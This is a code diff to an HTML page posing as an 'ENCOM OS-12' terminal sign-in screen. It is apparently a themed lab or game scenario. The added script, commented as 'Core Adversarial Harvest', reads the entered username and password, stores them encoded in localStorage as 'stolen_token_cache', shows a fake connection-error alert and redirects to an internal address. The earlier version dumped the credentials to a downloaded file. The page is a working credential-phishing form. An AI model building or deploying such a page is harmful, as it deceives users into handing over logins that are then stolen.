@@ -2,40 +2,54 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>ENCOM OS-12 // Terminal Sign-In</title>
+    <title>ENCOM OS-12 // Authentication Gateway</title>
     <style>
-        body { background-color: #020208; color: #00f2fe; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 95vh; margin: 0; }
-        .box { width: 400px; padding: 30px; border: 2px solid #00f2fe; background: rgba(4, 12, 26, 0.9); text-align: center; box-shadow: 0 0 15px rgba(0, 242, 254, 0.3); }
-        input[type="text"], input[type="password"] { width: 100%; padding: 10px; background: #040c1a; border: 1px solid #4facfe; color: #fff; margin-bottom: 20px; box-sizing: border-box; }
-        button { background: #00f2fe; color: #020208; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; }
+        body { background-color: #020208; color: #00f2fe; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 95vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .box { width: 450px; padding: 40px; border: 2px solid #00f2fe; background: rgba(4, 12, 26, 0.9); box-shadow: 0 0 15px rgba(0, 242, 254, 0.3); }
+        h1 { font-size: 18px; font-weight: normal; margin-top: 0; border-bottom: 1px dashed #00f2fe; padding-bottom: 10px; text-transform: uppercase; }
+        h2 { font-size: 24px; margin-top: 10px; margin-bottom: 5px; }
+        p { margin-bottom: 25px; color: #4facfe; }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        .label { font-weight: bold; margin-bottom: 5px; display: block; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px; background: #040c1a; border: 1px solid #4facfe; color: #fff; box-sizing: border-box; font-family: 'Courier New', monospace; font-size: 14px; }
+        button { background: #00f2fe; color: #020208; border: none; padding: 14px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; font-family: 'Courier New', monospace; font-size: 14px; margin-top: 15px; }
         button:hover { background: #fff; box-shadow: 0 0 10px #fff; }
+        .err { color: #ff0055; font-weight: bold; font-size: 13px; margin-top: 20px; text-align: center; display: none; border: 1px solid #ff0055; padding: 10px; background: rgba(255, 0, 85, 0.1); }
     </style>
 </head>
 <body>
 <div class="box">
-    <h2>Grid Node Authentication</h2>
-    <p>INTERNAL WORKSTATION ACCESS ONLY</p>
+    <h1>ENCOM OS-12 // Authentication Gateway</h1>
+    <h2>Grid Sign-In</h2>
+    <p>Secure Node Terminal Access</p>
+    
     <form onsubmit="captureHarvest(event)">
-        <input type="text" id="u" placeholder="IDENTITY HANDLE" required autocomplete="off">
-        <input type="password" id="p" placeholder="ACCESS TOKEN" required>
-        <button type="submit">Establish Handshake</button>
+        <div class="input-group">
+            <span class="label">> IDENTITY HANDLE:</span>
+            <input type="text" id="username" required autocomplete="off">
+        </div>
+        <div class="input-group">
+            <span class="label">> ACCESS TOKEN:</span>
+            <input type="password" id="password" required>
+        </div>
+        <button type="submit">Execute Handshake</button>
+        <div id="error-msg" class="err">INVALID CREDENTIALS // ACCESS DENIED</div>
     </form>
 </div>
+
 <script>
-function captureHarvest(event) {
-    event.preventDefault();
-    const username = document.getElementById('u').value;
-    const password = document.getElementById('p').value;
-    const logData = `[HARVEST CAPTURE] USER: ${username} | PASS: ${password}\n`;
+function captureHarvest(e) {
+    e.preventDefault();
+    const u = document.getElementById('username').value;
+    const p = document.getElementById('password').value;
+
+    // 1. Core Adversarial Harvest: blind capture of inputted strings
+    const logData = `[HARVEST CAPTURE] USER: ${u} | PASS: ${p}\n`;
     localStorage.setItem('stolen_token_cache', btoa(logData));
-    const blob = new Blob([logData], { type: 'text/plain' });
-    const link = document.createElement('a');
-    link.href = window.URL.createObjectURL(blob);
-    link.download = 'encom_session_debug.txt';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-    alert("CRITICAL LINK ERROR: Connection timeout. Redirecting to backup terminal node...");
+
+    // 2. Network Redirection Pivot to the Server Node
+    alert("CRITICAL LINK ERROR: Local gateway routing degraded. Redirecting session parameters via backup internal server node...");
+    window.location.href = "http://10.1.1";
 }
 </script>
 </body>
